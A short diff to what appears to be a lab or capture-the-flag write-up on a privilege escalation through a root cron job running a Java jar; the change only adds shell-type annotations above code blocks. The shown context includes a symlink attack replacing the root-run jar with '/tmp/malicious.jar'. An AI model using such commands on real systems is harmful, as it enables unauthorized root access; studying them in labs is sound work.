@@ -14,6 +14,7 @@ A root cron job repeatedly ran a Java workflow from `/root/java/`. The applicati
 
 ## Enumeration
 
+<!-- cmd: linux -->
 ```bash
 cat /etc/crontab
 jar xf Example_Root.jar
@@ -24,6 +25,7 @@ Used on: **Aster** - the cron entry ran `cd /root/java/ && bash run.sh` every mi
 
 ## Symlink Attack
 
+<!-- cmd: linux -->
 ```bash
 ln -sf /tmp/malicious.jar /root/java/Example_Root.jar
 ln -sf /tmp/root.txt /home/harry/root.txt
